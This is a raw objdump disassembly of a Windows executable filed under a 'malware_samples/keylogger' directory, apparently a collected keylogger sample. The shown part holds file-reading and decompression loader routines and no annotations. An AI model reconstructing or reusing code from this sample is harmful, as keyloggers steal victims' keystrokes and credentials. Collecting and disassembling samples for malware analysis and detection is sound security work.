
malware_samples/keylogger/28b0a03f8ba7934a4f29a1c62e67ac6e5137234a9795149948766e44afb483a3.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 0f ee 00 00       	call   0x14000fe18
   140001009:	8b 08                	mov    (%rax),%ecx
   14000100b:	48 8b 05 ee cf 03 00 	mov    0x3cfee(%rip),%rax        # 0x14003e000
   140001012:	89 08                	mov    %ecx,(%rax)
   140001014:	e8 07 ee 00 00       	call   0x14000fe20
   140001019:	48 8b 08             	mov    (%rax),%rcx
   14000101c:	48 8b 05 dd cf 03 00 	mov    0x3cfdd(%rip),%rax        # 0x14003e000
   140001023:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001027:	48 8b 0d d2 cf 03 00 	mov    0x3cfd2(%rip),%rcx        # 0x14003e000
   14000102e:	48 83 c4 28          	add    $0x28,%rsp
   140001032:	e9 89 27 00 00       	jmp    0x1400037c0
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 05 91 23 04 00 	lea    0x42391(%rip),%rax        # 0x1400433d8
   140001047:	c3                   	ret
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001055:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000105a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000105f:	57                   	push   %rdi
   140001060:	41 54                	push   %r12
   140001062:	41 55                	push   %r13
   140001064:	41 56                	push   %r14
   140001066:	41 57                	push   %r15
   140001068:	48 83 ec 30          	sub    $0x30,%rsp
   14000106c:	4c 8b f2             	mov    %rdx,%r14
   14000106f:	33 f6                	xor    %esi,%esi
   140001071:	48 8d 15 4c a8 02 00 	lea    0x2a84c(%rip),%rdx        # 0x14002b8c4
   140001078:	44 8b fe             	mov    %esi,%r15d
   14000107b:	49 8b f8             	mov    %r8,%rdi
   14000107e:	48 8b d9             	mov    %rcx,%rbx
   140001081:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140001087:	e8 34 35 00 00       	call   0x1400045c0
   14000108c:	4c 8b e0             	mov    %rax,%r12
   14000108f:	48 85 c0             	test   %rax,%rax
   140001092:	75 15                	jne    0x1400010a9
   140001094:	49 8d 56 12          	lea    0x12(%r14),%rdx
   140001098:	48 8d 0d 29 a8 02 00 	lea    0x2a829(%rip),%rcx        # 0x14002b8c8
   14000109f:	e8 6c 16 00 00       	call   0x140002710
   1400010a4:	e9 21 01 00 00       	jmp    0x1400011ca
   1400010a9:	41 8b 56 04          	mov    0x4(%r14),%edx
   1400010ad:	45 33 c0             	xor    %r8d,%r8d
   1400010b0:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400010b7:	49 8b cc             	mov    %r12,%rcx
   1400010ba:	e8 15 f6 00 00       	call   0x1400106d4
   1400010bf:	85 c0                	test   %eax,%eax
   1400010c1:	79 23                	jns    0x1400010e6
   1400010c3:	e8 40 3e 01 00       	call   0x140014f08
   1400010c8:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400010cc:	4c 8d 05 2d a8 02 00 	lea    0x2a82d(%rip),%r8        # 0x14002b900
   1400010d3:	48 8d 0d 62 a8 02 00 	lea    0x2a862(%rip),%rcx        # 0x14002b93c
   1400010da:	8b 10                	mov    (%rax),%edx
   1400010dc:	e8 2f 18 00 00       	call   0x140002910
   1400010e1:	e9 c6 00 00 00       	jmp    0x1400011ac
   1400010e6:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   1400010ea:	e8 55 3e 01 00       	call   0x140014f44
   1400010ef:	4c 8b f8             	mov    %rax,%r15
   1400010f2:	48 85 c0             	test   %rax,%rax
   1400010f5:	75 2b                	jne    0x140001122
   1400010f7:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   1400010fb:	e8 08 3e 01 00       	call   0x140014f08
   140001100:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   140001104:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001108:	4c 8d 05 41 a8 02 00 	lea    0x2a841(%rip),%r8        # 0x14002b950
   14000110f:	48 8d 0d 4e a6 02 00 	lea    0x2a64e(%rip),%rcx        # 0x14002b764
   140001116:	8b 10                	mov    (%rax),%edx
   140001118:	e8 f3 17 00 00       	call   0x140002910
   14000111d:	e9 8a 00 00 00       	jmp    0x1400011ac
   140001122:	41 80 7e 10 01       	cmpb   $0x1,0x10(%r14)
   140001127:	75 13                	jne    0x14000113c
   140001129:	4d 8b cf             	mov    %r15,%r9
   14000112c:	45 33 c0             	xor    %r8d,%r8d
   14000112f:	49 8b d6             	mov    %r14,%rdx
   140001132:	49 8b cc             	mov    %r12,%rcx
   140001135:	e8 d6 00 00 00       	call   0x140001210
   14000113a:	eb 61                	jmp    0x14000119d
   14000113c:	41 8b 5e 0c          	mov    0xc(%r14),%ebx
   140001140:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140001145:	49 8b ef             	mov    %r15,%rbp
   140001148:	48 85 db             	test   %rbx,%rbx
   14000114b:	74 44                	je     0x140001191
   14000114d:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001152:	0f 1f 40 00          	nopl   0x0(%rax)
   140001156:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000115d:	00 00 00 
   140001160:	48 3b d8             	cmp    %rax,%rbx
   140001163:	48 8b fb             	mov    %rbx,%rdi
   140001166:	4d 8b cc             	mov    %r12,%r9
   140001169:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000116f:	48 0f 47 f8          	cmova  %rax,%rdi
   140001173:	48 8b cd             	mov    %rbp,%rcx
   140001176:	48 8b d7             	mov    %rdi,%rdx
   140001179:	e8 1e f2 00 00       	call   0x14001039c
   14000117e:	48 83 f8 01          	cmp    $0x1,%rax
   140001182:	72 69                	jb     0x1400011ed
   140001184:	48 03 ef             	add    %rdi,%rbp
   140001187:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000118c:	48 2b df             	sub    %rdi,%rbx
   14000118f:	75 cf                	jne    0x140001160
   140001191:	8b c6                	mov    %esi,%eax
   140001193:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140001198:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000119d:	85 c0                	test   %eax,%eax
   14000119f:	74 0b                	je     0x1400011ac
   1400011a1:	49 8b cf             	mov    %r15,%rcx
   1400011a4:	e8 87 3d 01 00       	call   0x140014f30
   1400011a9:	4c 8b fe             	mov    %rsi,%r15
   1400011ac:	49 8b cc             	mov    %r12,%rcx
   1400011af:	e8 98 ee 00 00       	call   0x14001004c
   1400011b4:	49 8b f7             	mov    %r15,%rsi
   1400011b7:	4d 85 ff             	test   %r15,%r15
   1400011ba:	74 0e                	je     0x1400011ca
   1400011bc:	48 8b d7             	mov    %rdi,%rdx
   1400011bf:	49 8b cf             	mov    %r15,%rcx
   1400011c2:	e8 29 35 00 00       	call   0x1400046f0
   1400011c7:	44 8b e8             	mov    %eax,%r13d
   1400011ca:	48 8b ce             	mov    %rsi,%rcx
   1400011cd:	e8 5e 3d 01 00       	call   0x140014f30
   1400011d2:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400011d7:	41 8b c5             	mov    %r13d,%eax
   1400011da:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400011df:	48 83 c4 30          	add    $0x30,%rsp
   1400011e3:	41 5f                	pop    %r15
   1400011e5:	41 5e                	pop    %r14
   1400011e7:	41 5d                	pop    %r13
   1400011e9:	41 5c                	pop    %r12
   1400011eb:	5f                   	pop    %rdi
   1400011ec:	c3                   	ret
   1400011ed:	e8 16 3d 01 00       	call   0x140014f08
   1400011f2:	4d 8d 4e 12          	lea    0x12(%r14),%r9
   1400011f6:	4c 8d 05 4b a6 02 00 	lea    0x2a64b(%rip),%r8        # 0x14002b848
   1400011fd:	48 8d 0d 78 a6 02 00 	lea    0x2a678(%rip),%rcx        # 0x14002b87c
   140001204:	8b 10                	mov    (%rax),%edx
   140001206:	e8 05 17 00 00       	call   0x140002910
   14000120b:	41 8b c5             	mov    %r13d,%eax
   14000120e:	eb 83                	jmp    0x140001193
   140001210:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001215:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000121a:	53                   	push   %rbx
   14000121b:	55                   	push   %rbp
   14000121c:	56                   	push   %rsi
   14000121d:	57                   	push   %rdi
   14000121e:	41 56                	push   %r14
   140001220:	41 57                	push   %r15
   140001222:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001229:	33 c0                	xor    %eax,%eax
   14000122b:	4d 8b f0             	mov    %r8,%r14
   14000122e:	48 8b da             	mov    %rdx,%rbx
   140001231:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001236:	48 8b f9             	mov    %rcx,%rdi
   140001239:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000123e:	41 b8 58 00 00 00    	mov    $0x58,%r8d
   140001244:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001249:	48 8d 15 70 a4 02 00 	lea    0x2a470(%rip),%rdx        # 0x14002b6c0
   140001250:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001254:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001259:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000125e:	8b e8                	mov    %eax,%ebp
   140001260:	49 8b f1             	mov    %r9,%rsi
   140001263:	e8 18 ab 00 00       	call   0x14000bd80
   140001268:	44 8b f8             	mov    %eax,%r15d
   14000126b:	85 c0                	test   %eax,%eax
   14000126d:	74 28                	je     0x140001297
   14000126f:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140001273:	44 8b c0             	mov    %eax,%r8d
   140001276:	48 8d 0d 53 a4 02 00 	lea    0x2a453(%rip),%rcx        # 0x14002b6d0
   14000127d:	e8 8e 14 00 00       	call   0x140002710
   140001282:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001287:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000128e:	41 5f                	pop    %r15
   140001290:	41 5e                	pop    %r14
   140001292:	5f                   	pop    %rdi
   140001293:	5e                   	pop    %rsi
   140001294:	5d                   	pop    %rbp
   140001295:	5b                   	pop    %rbx
   140001296:	c3                   	ret
   140001297:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000129c:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
   1400012a3:	00 
   1400012a4:	e8 9b 3c 01 00       	call   0x140014f44
   1400012a9:	4c 8b e8             	mov    %rax,%r13
   1400012ac:	48 85 c0             	test   %rax,%rax
   1400012af:	75 23                	jne    0x1400012d4
   1400012b1:	e8 52 3c 01 00       	call   0x140014f08
   1400012b6:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ba:	4c 8d 05 5f a4 02 00 	lea    0x2a45f(%rip),%r8        # 0x14002b720
   1400012c1:	48 8d 0d 9c a4 02 00 	lea    0x2a49c(%rip),%rcx        # 0x14002b764
   1400012c8:	8b 10                	mov    (%rax),%edx
   1400012ca:	e8 41 16 00 00       	call   0x140002910
   1400012cf:	e9 65 01 00 00       	jmp    0x140001439
   1400012d4:	b9 00 20 00 00       	mov    $0x2000,%ecx
   1400012d9:	e8 66 3c 01 00       	call   0x140014f44
   1400012de:	48 8b e8             	mov    %rax,%rbp
   1400012e1:	48 85 c0             	test   %rax,%rax
   1400012e4:	75 23                	jne    0x140001309
   1400012e6:	e8 1d 3c 01 00       	call   0x140014f08
   1400012eb:	4c 8d 4b 12          	lea    0x12(%rbx),%r9
   1400012ef:	4c 8d 05 7a a4 02 00 	lea    0x2a47a(%rip),%r8        # 0x14002b770
   1400012f6:	48 8d 0d 67 a4 02 00 	lea    0x2a467(%rip),%rcx        # 0x14002b764
   1400012fd:	8b 10                	mov    (%rax),%edx
   1400012ff:	e8 0c 16 00 00       	call   0x140002910
   140001304:	e9 30 01 00 00       	jmp    0x140001439
   140001309:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   140001310:	00 
   140001311:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001317:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   14000131b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001320:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001325:	49 8b dc             	mov    %r12,%rbx
   140001328:	4c 3b e0             	cmp    %rax,%r12
   14000132b:	4c 8b cf             	mov    %rdi,%r9
   14000132e:	ba 01 00 00 00       	mov    $0x1,%edx
   140001333:	49 8b cd             	mov    %r13,%rcx
   140001336:	48 0f 47 d8          	cmova  %rax,%rbx
   14000133a:	4c 8b c3             	mov    %rbx,%r8
   14000133d:	e8 5a f0 00 00       	call   0x14001039c
   140001342:	48 3b c3             	cmp    %rbx,%rax
   140001345:	0f 85 e6 00 00 00    	jne    0x140001431
   14000134b:	48 8b cf             	mov    %rdi,%rcx
   14000134e:	e8 bd ed 00 00       	call   0x140010110
   140001353:	85 c0                	test   %eax,%eax
   140001355:	0f 85 d6 00 00 00    	jne    0x140001431
   14000135b:	4c 2b e3             	sub    %rbx,%r12
   14000135e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001362:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001367:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000136e:	00 00 
   140001370:	bb 00 20 00 00       	mov    $0x2000,%ebx
   140001375:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000137a:	33 d2                	xor    %edx,%edx
   14000137c:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140001380:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001385:	e8 36 8e 00 00       	call   0x14000a1c0
   14000138a:	8b f8                	mov    %eax,%edi
   14000138c:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001392:	8d 48 04             	lea    0x4(%rax),%ecx
   140001395:	83 f9 02             	cmp    $0x2,%ecx
   140001398:	76 7c                	jbe    0x140001416
   14000139a:	83 f8 02             	cmp    $0x2,%eax
   14000139d:	74 72                	je     0x140001411
   14000139f:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   1400013a3:	48 2b d9             	sub    %rcx,%rbx
   1400013a6:	4d 85 f6             	test   %r14,%r14
   1400013a9:	74 29                	je     0x1400013d4
   1400013ab:	4d 8b ce             	mov    %r14,%r9
   1400013ae:	4c 8b c3             	mov    %rbx,%r8
   1400013b1:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013b6:	48 8b cd             	mov    %rbp,%rcx
   1400013b9:	e8 1e f7 00 00       	call   0x140010adc
   1400013be:	48 3b c3             	cmp    %rbx,%rax
   1400013c1:	75 0c                	jne    0x1400013cf
   1400013c3:	49 8b ce             	mov    %r14,%rcx
   1400013c6:	e8 45 ed 00 00       	call   0x140010110
   1400013cb:	85 c0                	test   %eax,%eax
   1400013cd:	74 1b                	je     0x1400013ea
   1400013cf:	41 8b ff             	mov    %r15d,%edi
   1400013d2:	eb 42                	jmp    0x140001416
   1400013d4:	48 85 f6             	test   %rsi,%rsi
   1400013d7:	74 11                	je     0x1400013ea
   1400013d9:	4c 8b c3             	mov    %rbx,%r8
   1400013dc:	48 8b d5             	mov    %rbp,%rdx
   1400013df:	48 8b ce             	mov    %rsi,%rcx
   1400013e2:	e8 49 8a 02 00       	call   0x140029e30
   1400013e7:	48 03 f3             	add    %rbx,%rsi
   1400013ea:	83 7c 24 38 00       	cmpl   $0x0,0x38(%rsp)
   1400013ef:	0f 84 7b ff ff ff    	je     0x140001370
   1400013f5:	83 ff 01             	cmp    $0x1,%edi
   1400013f8:	74 12                	je     0x14000140c
   1400013fa:	4d 85 e4             	test   %r12,%r12
   1400013fd:	74 17                	je     0x140001416
   1400013ff:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140001406:	00 
   140001407:	e9 14 ff ff ff       	jmp    0x140001320
   14000140c:	45 33 ff             	xor    %r15d,%r15d
   14000140f:	eb 20                	jmp    0x140001431
   140001411:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   140001416:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   14000141d:	00 
   14000141e:	48 8d 0d 9b a3 02 00 	lea    0x2a39b(%rip),%rcx        # 0x14002b7c0
   140001425:	48 83 c2 12          	add    $0x12,%rdx
   140001429:	44 8b c7             	mov    %edi,%r8d
   14000142c:	e8 df 12 00 00       	call   0x140002710
   140001431:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140001438:	00 
   140001439:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000143e:	e8 1d a6 00 00       	call   0x14000ba60
   140001443:	49 8b cd             	mov    %r13,%rcx
   140001446:	e8 e5 3a 01 00       	call   0x140014f30
   14000144b:	48 8b cd             	mov    %rbp,%rcx
   14000144e:	e8 dd 3a 01 00       	call   0x140014f30
   140001453:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000145a:	00 
   14000145b:	41 8b c7             	mov    %r15d,%eax
   14000145e:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001465:	41 5f                	pop    %r15
   140001467:	41 5e                	pop    %r14
   140001469:	5f                   	pop    %rdi
   14000146a:	5e                   	pop    %rsi
   14000146b:	5d                   	pop    %rbp
   14000146c:	5b                   	pop    %rbx
   14000146d:	c3                   	ret
   14000146e:	cc                   	int3
   14000146f:	cc                   	int3
   140001470:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001475:	55                   	push   %rbp
   140001476:	41 56                	push   %r14
   140001478:	41 57                	push   %r15
   14000147a:	48 83 ec 30          	sub    $0x30,%rsp
   14000147e:	48 8b ea             	mov    %rdx,%rbp
   140001481:	48 8b d9             	mov    %rcx,%rbx
   140001484:	48 8d 15 39 a4 02 00 	lea    0x2a439(%rip),%rdx        # 0x14002b8c4
   14000148b:	45 33 f6             	xor    %r14d,%r14d
   14000148e:	e8 2d 31 00 00       	call   0x1400045c0
   140001493:	4c 8b f8             	mov    %rax,%r15
   140001496:	48 85 c0             	test   %rax,%rax
   140001499:	75 21                	jne    0x1400014bc
   14000149b:	48 8d 55 12          	lea    0x12(%rbp),%rdx
   14000149f:	48 8d 0d 22 a4 02 00 	lea    0x2a422(%rip),%rcx        # 0x14002b8c8
   1400014a6:	e8 65 12 00 00       	call   0x140002710
   1400014ab:	33 c0                	xor    %eax,%eax
   1400014ad:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400014b2:	48 83 c4 30          	add    $0x30,%rsp
   1400014b6:	41 5f                	pop    %r15
   1400014b8:	41 5e                	pop    %r14
   1400014ba:	5d                   	pop    %rbp
   1400014bb:	c3                   	ret
   1400014bc:	8b 55 04             	mov    0x4(%rbp),%edx
   1400014bf:	45 33 c0             	xor    %r8d,%r8d
   1400014c2:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400014c9:	49 8b cf             	mov    %r15,%rcx
   1400014cc:	e8 03 f2 00 00       	call   0x1400106d4
   1400014d1:	85 c0                	test   %eax,%eax
   1400014d3:	79 23                	jns    0x1400014f8
   1400014d5:	e8 2e 3a 01 00       	call   0x140014f08
   1400014da:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400014de:	4c 8d 05 1b a4 02 00 	lea    0x2a41b(%rip),%r8        # 0x14002b900
   1400014e5:	48 8d 0d 50 a4 02 00 	lea    0x2a450(%rip),%rcx        # 0x14002b93c
   1400014ec:	8b 10                	mov    (%rax),%edx
   1400014ee:	e8 1d 14 00 00       	call   0x140002910
   1400014f3:	e9 c4 00 00 00       	jmp    0x1400015bc
   1400014f8:	8b 4d 0c             	mov    0xc(%rbp),%ecx
   1400014fb:	e8 44 3a 01 00       	call   0x140014f44
   140001500:	4c 8b f0             	mov    %rax,%r14
   140001503:	48 85 c0             	test   %rax,%rax
   140001506:	75 2a                	jne    0x140001532
   140001508:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000150b:	e8 f8 39 01 00       	call   0x140014f08
   140001510:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   140001514:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001518:	4c 8d 05 31 a4 02 00 	lea    0x2a431(%rip),%r8        # 0x14002b950
   14000151f:	48 8d 0d 3e a2 02 00 	lea    0x2a23e(%rip),%rcx        # 0x14002b764
   140001526:	8b 10                	mov    (%rax),%edx
   140001528:	e8 e3 13 00 00       	call   0x140002910
   14000152d:	e9 8a 00 00 00       	jmp    0x1400015bc
   140001532:	80 7d 10 01          	cmpb   $0x1,0x10(%rbp)
   140001536:	75 13                	jne    0x14000154b
   140001538:	4d 8b ce             	mov    %r14,%r9
   14000153b:	45 33 c0             	xor    %r8d,%r8d
   14000153e:	48 8b d5             	mov    %rbp,%rdx
   140001541:	49 8b cf             	mov    %r15,%rcx
   140001544:	e8 c7 fc ff ff       	call   0x140001210
   140001549:	eb 62                	jmp    0x1400015ad
   14000154b:	8b 5d 0c             	mov    0xc(%rbp),%ebx
   14000154e:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140001553:	49 8b f6             	mov    %r14,%rsi
   140001556:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   14000155b:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001560:	48 85 db             	test   %rbx,%rbx
   140001563:	74 37                	je     0x14000159c
   140001565:	41 bc 00 20 00 00    	mov    $0x2000,%r12d
   14000156b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001570:	49 3b dc             	cmp    %r12,%rbx
   140001573:	48 8b fb             	mov    %rbx,%rdi
   140001576:	4d 8b cf             	mov    %r15,%r9
   140001579:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000157f:	49 0f 47 fc          	cmova  %r12,%rdi
   140001583:	48 8b ce             	mov    %rsi,%rcx
   140001586:	48 8b d7             	mov    %rdi,%rdx
   140001589:	e8 0e ee 00 00       	call   0x14001039c
   14000158e:	48 83 f8 01          	cmp    $0x1,%rax
   140001592:	72 42                	jb     0x1400015d6
   140001594:	48 03 f7             	add    %rdi,%rsi
   140001597:	48 2b df             	sub    %rdi,%rbx
   14000159a:	75 d4                	jne    0x140001570
   14000159c:	33 c0                	xor    %eax,%eax
   14000159e:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400015a3:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400015a8:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   1400015ad:	85 c0                	test   %eax,%eax
   1400015af:	74 0b                	je     0x1400015bc
   1400015b1:	49 8b ce             	mov    %r14,%rcx
   1400015b4:	e8 77 39 01 00       	call   0x140014f30
   1400015b9:	45 33 f6             	xor    %r14d,%r14d
   1400015bc:	49 8b cf             	mov    %r15,%rcx
   1400015bf:	e8 88 ea 00 00       	call   0x14001004c
   1400015c4:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400015c9:	49 8b c6             	mov    %r14,%rax
   1400015cc:	48 83 c4 30          	add    $0x30,%rsp
   1400015d0:	41 5f                	pop    %r15
   1400015d2:	41 5e                	pop    %r14
   1400015d4:	5d                   	pop    %rbp
   1400015d5:	c3                   	ret
   1400015d6:	e8 2d 39 01 00       	call   0x140014f08
   1400015db:	4c 8d 4d 12          	lea    0x12(%rbp),%r9
   1400015df:	4c 8d 05 62 a2 02 00 	lea    0x2a262(%rip),%r8        # 0x14002b848
   1400015e6:	48 8d 0d 8f a2 02 00 	lea    0x2a28f(%rip),%rcx        # 0x14002b87c
   1400015ed:	8b 10                	mov    (%rax),%edx
   1400015ef:	e8 1c 13 00 00       	call   0x140002910
   1400015f4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015f9:	eb a3                	jmp    0x14000159e
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	40 53                	rex push %rbx
   140001602:	57                   	push   %rdi
   140001603:	48 83 ec 38          	sub    $0x38,%rsp
   140001607:	80 7a 11 6e          	cmpb   $0x6e,0x11(%rdx)
   14000160b:	48 8b fa             	mov    %rdx,%rdi
   14000160e:	48 8b d9             	mov    %rcx,%rbx
   140001611:	75 24                	jne    0x140001637
   140001613:	e8 38 fa ff ff       	call   0x140001050
   140001618:	8b d8                	mov    %eax,%ebx
   14000161a:	85 c0                	test   %eax,%eax
   14000161c:	79 10                	jns    0x14000162e
   14000161e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   140001622:	48 8d 0d 6f a3 02 00 	lea    0x2a36f(%rip),%rcx        # 0x14002b998
   140001629:	e8 e2 10 00 00       	call   0x140002710
   14000162e:	8b c3                	mov    %ebx,%eax
   140001630:	48 83 c4 38          	add    $0x38,%rsp
   140001634:	5f                   	pop    %rdi
   140001635:	5b                   	pop    %rbx
   140001636:	c3                   	ret
   140001637:	48 8d 15 7e a3 02 00 	lea    0x2a37e(%rip),%rdx        # 0x14002b9bc
   14000163e:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140001643:	49 8b c8             	mov    %r8,%rcx
   140001646:	e8 75 2f 00 00       	call   0x1400045c0
   14000164b:	4c 8b e0             	mov    %rax,%r12
   14000164e:	48 85 c0             	test   %rax,%rax
   140001651:	75 2f                	jne    0x140001682
   140001653:	e8 b0 38 01 00       	call   0x140014f08
   140001658:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   14000165c:	4c 8d 05 5d a3 02 00 	lea    0x2a35d(%rip),%r8        # 0x14002b9c0
   140001663:	48 8d 0d 8a a3 02 00 	lea    0x2a38a(%rip),%rcx        # 0x14002b9f4
   14000166a:	8b 10                	mov    (%rax),%edx
   14000166c:	e8 9f 12 00 00       	call   0x140002910
   140001671:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001676:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000167b:	48 83 c4 38          	add    $0x38,%rsp
   14000167f:	5f                   	pop    %rdi
   140001680:	5b                   	pop    %rbx
   140001681:	c3                   	ret
   140001682:	48 8d 15 3b a2 02 00 	lea    0x2a23b(%rip),%rdx        # 0x14002b8c4
   140001689:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000168e:	48 8b cb             	mov    %rbx,%rcx
   140001691:	e8 2a 2f 00 00       	call   0x1400045c0
   140001696:	4c 8b f8             	mov    %rax,%r15
   140001699:	48 85 c0             	test   %rax,%rax
   14000169c:	75 1a                	jne    0x1400016b8
   14000169e:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400016a2:	48 8d 0d 1f a2 02 00 	lea    0x2a21f(%rip),%rcx        # 0x14002b8c8
   1400016a9:	e8 62 10 00 00       	call   0x140002710
   1400016ae:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016b3:	e9 69 01 00 00       	jmp    0x140001821
   1400016b8:	8b 57 04             	mov    0x4(%rdi),%edx
   1400016bb:	45 33 c0             	xor    %r8d,%r8d
   1400016be:	48 03 93 00 10 00 00 	add    0x1000(%rbx),%rdx
   1400016c5:	49 8b cf             	mov    %r15,%rcx
   1400016c8:	e8 07 f0 00 00       	call   0x1400106d4
   1400016cd:	85 c0                	test   %eax,%eax
   1400016cf:	79 28                	jns    0x1400016f9
   1400016d1:	e8 32 38 01 00       	call   0x140014f08
   1400016d6:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400016da:	4c 8d 05 1f a2 02 00 	lea    0x2a21f(%rip),%r8        # 0x14002b900
   1400016e1:	48 8d 0d 54 a2 02 00 	lea    0x2a254(%rip),%rcx        # 0x14002b93c
   1400016e8:	8b 10                	mov    (%rax),%edx
   1400016ea:	e8 21 12 00 00       	call   0x140002910
   1400016ef:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400016f4:	e9 20 01 00 00       	jmp    0x140001819
   1400016f9:	80 7f 10 01          	cmpb   $0x1,0x10(%rdi)
   1400016fd:	75 18                	jne    0x140001717
   1400016ff:	45 33 c9             	xor    %r9d,%r9d
   140001702:	4d 8b c4             	mov    %r12,%r8
   140001705:	48 8b d7             	mov    %rdi,%rdx
   140001708:	49 8b cf             	mov    %r15,%rcx
   14000170b:	e8 00 fb ff ff       	call   0x140001210
   140001710:	8b d8                	mov    %eax,%ebx
   140001712:	e9 02 01 00 00       	jmp    0x140001819
   140001717:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000171c:	33 db                	xor    %ebx,%ebx
   14000171e:	41 bd 00 20 00 00    	mov    $0x2000,%r13d
   140001724:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140001729:	41 8b cd             	mov    %r13d,%ecx
   14000172c:	e8 13 38 01 00       	call   0x140014f44
   140001731:	4c 8b f0             	mov    %rax,%r14
   140001734:	48 85 c0             	test   %rax,%rax
   140001737:	75 28                	jne    0x140001761
   140001739:	e8 ca 37 01 00       	call   0x140014f08
   14000173e:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   140001742:	4c 8d 05 bf a0 02 00 	lea    0x2a0bf(%rip),%r8        # 0x14002b808
